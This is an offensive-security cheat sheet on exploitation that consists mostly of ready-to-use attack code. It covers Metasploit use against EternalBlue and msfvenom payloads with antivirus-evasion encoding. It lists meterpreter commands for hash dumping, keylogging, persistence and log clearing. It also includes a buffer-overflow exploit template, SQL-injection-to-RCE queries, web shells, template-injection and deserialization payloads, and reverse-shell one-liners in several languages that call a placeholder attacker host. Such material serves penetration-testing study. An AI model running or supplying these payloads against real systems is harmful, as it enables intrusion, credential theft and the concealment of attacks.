# Exploitation Techniques

## Overview

Exploitation involves leveraging vulnerabilities to gain unauthorized access or execute arbitrary code on target systems.

---

## Metasploit Framework

### Basic Usage
```bash
# Start Metasploit
msfconsole

# Search for exploits
search <keyword>
search type:exploit platform:windows
search cve:2021

# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads
show targets

# Set options
set RHOSTS target_ip
set LHOST attacker_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444

# Check if target is vulnerable
check

# Launch exploit
exploit
run
```

### Meterpreter Commands
```bash
# System information
sysinfo
getuid
getpid

# File system
pwd
ls
cd
cat file.txt
download /path/to/file
upload /local/file /remote/path

# Process management
ps
migrate <PID>
kill <PID>

# Network
ipconfig
route
portfwd add -l 3389 -p 3389 -r target_ip

# Privilege escalation
getsystem
getprivs

# Hash dumping
hashdump
run post/windows/gather/smart_hashdump

# Persistence
run persistence -X -i 60 -p 4444 -r attacker_ip

# Screenshots
screenshot
screenshare

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Shell access
shell
execute -f cmd.exe -i

# Clear logs
clearev
```

### Payload Generation
```bash
# msfvenom - Generate payloads

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw -o shell.php

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw -o shell.jsp

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp -o shell.asp

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw -o shell.py

# Shellcode formats
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f c
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python

# Encoded payloads (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o multi_encoded.exe
```

### Multi/Handler
```bash
# Set up listener for reverse shells
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit -j  # Run as job
```

---

## Buffer Overflow Exploitation

### Stack-Based Buffer Overflow

#### Fuzzing
```python
#!/usr/bin/env python3
import socket
import sys

target_ip = "192.168.1.10"
target_port = 9999

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(buffer.encode())
        s.close()
        print(f"Sent {len(buffer)} bytes")
        buffer = buffer + "A" * 100
    except:
        print(f"Crashed at {len(buffer)} bytes")
        sys.exit(0)
```

#### Finding Offset
```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
```

#### Bad Characters
```python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  # ... and so on
)
```

#### JMP ESP
```bash
# Find JMP ESP address with Immunity Debugger
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Or use msfpescan
msfpescan -j esp -p module.dll
```

#### Exploit Template
```python
#!/usr/bin/env python3
import socket

target_ip = "192.168.1.10"
target_port = 9999

offset = 524
return_address = "\x8f\x35\x4a\x5f"  # JMP ESP address (little endian)

# msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f c -b "\x00\x0a\x0d"
shellcode = (
  "\xda\xc1\xba\x37\xc1\x5d\x8d\xd9\x74\x24\xf4\x5e\x29\xc9"
  # ... shellcode here ...
)

buffer = "A" * offset
buffer += return_address
buffer += "\x90" * 16  # NOP sled
buffer += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(buffer.encode())
s.close()
```

### Heap-Based Buffer Overflow
- More complex than stack overflows
- Requires understanding of heap memory management
- Use-after-free vulnerabilities
- Heap spraying techniques

---

## Return-Oriented Programming (ROP)

```python
# ROP chain example
from struct import pack

# ROP gadgets (found with ROPgadget or ropper)
rop_chain = pack('<I', 0x080bb196)  # pop edx ; ret
rop_chain += pack('<I', 0x080eb060)  # @ .data
rop_chain += pack('<I', 0x080b8016)  # pop eax ; ret
rop_chain += '/bin'
rop_chain += pack('<I', 0x08054e3d)  # mov dword ptr [edx], eax ; ret
# ... continue building ROP chain
```

### ROP Tools
```bash
# ROPgadget
ROPgadget --binary binary_file

# Ropper
ropper --file binary_file --search "pop eax"
```

---

## Web Application Exploitation

See `03-web-application/` for detailed web exploitation techniques.

---

## Database Exploitation

### SQL Injection to RCE
```sql
-- MySQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- PostgreSQL
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

---

## Remote Code Execution (RCE)

### Command Injection
```bash
# Basic injection
; whoami
| whoami
& whoami
`whoami`
$(whoami)

# Reverse shell
; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
; nc -e /bin/bash attacker_ip 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Unrestricted File Upload to RCE
```php
# PHP web shell
<?php system($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

# Upload and access
http://target.com/uploads/shell.php?cmd=whoami
```

### Template Injection
```python
# Server-Side Template Injection (SSTI)
# Jinja2 (Python)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
```

### Deserialization Attacks
```python
# Python pickle
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('nc -e /bin/bash attacker_ip 4444',))

pickle.dumps(RCE())
```

```java
// Java deserialization
// Use ysoserial
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash attacker_ip 4444' | base64
```

---

## Exploit Development

### Vulnerability Research
```bash
# Search exploits
searchsploit apache
searchsploit -m exploits/linux/remote/1234.c

# ExploitDB
https://www.exploit-db.com/

# NVD
https://nvd.nist.gov/
```

### Debugging Tools
```bash
# GDB
gdb ./binary
break main
run
continue
info registers
x/100x $esp

# GDB with PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Radare2
r2 -d binary
aa  # Analyze all
afl  # List functions
pdf @main  # Disassemble main

# Immunity Debugger (Windows)
# Mona plugin
!mona config -set workingfolder C:\mona
!mona bytearray -cpb "\x00\x0a\x0d"
!mona compare -f C:\mona\bytearray.bin -a <ESP_address>
```

---

## Shellcode Development

### Basic Shellcode
```nasm
; Linux x86 execve /bin/sh
section .text
global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
```

### Shellcode Testing
```c
#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/bash attacker_ip 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Listener
```bash
# Netcat listener
nc -nlvp 4444

# Socat listener
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Metasploit multi/handler
use multi/handler
set PAYLOAD <matching_payload>
set LHOST attacker_ip
set LPORT 4444
exploit
```

---

## Post-Exploitation Frameworks

### Empire
```bash
# Start Empire
./empire

# Create listener
listeners
uselistener http
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
execute

# Interact with agent
agents
interact <agent_name>
```

### Cobalt Strike
```bash
# Commercial C2 framework
# Team server and client model
# Beacon payload
# Malleable C2 profiles
```

---

## Exploit Mitigation Bypass

### DEP (Data Execution Prevention)
- ROP chains
- Return-to-libc

### ASLR (Address Space Layout Randomization)
- Information leaks
- Brute forcing (32-bit)
- ROP with known addresses

### Stack Canaries
- Information disclosure
- Brute force byte-by-byte
- Overwrite canary with same value

---

## Exploit Resources

### Exploit Databases
- Exploit-DB
- Rapid7 Vulnerability Database
- Packet Storm
- Security Focus

### CVE Databases
- NVD (National Vulnerability Database)
- MITRE CVE
- CVE Details

### Exploit Frameworks
- Metasploit
- ExploitPack
- Canvas
- Core Impact

---

## Further Reading

- The Shellcoder's Handbook
- Hacking: The Art of Exploitation
- Metasploit: The Penetration Tester's Guide
- Exploit Development course (Offensive Security)
